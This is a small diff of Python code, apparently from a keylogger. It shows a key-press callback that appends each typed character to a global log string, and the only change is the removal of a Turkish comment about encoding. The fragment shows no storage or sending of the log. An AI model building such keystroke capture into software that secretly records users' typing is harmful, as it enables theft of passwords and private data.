@@ -5,7 +5,7 @@ def callback_function(key):
     global log
     try:
         log = log + str(key.char)
-        # log = log.encode() + key.char.encode("utf-8") -> eğerki türkçe karakt. hata verirse bu şekilde çözülür
+        # log = log.encode() + key.char.encode("utf-8") 
 
 
     except AttributeError:
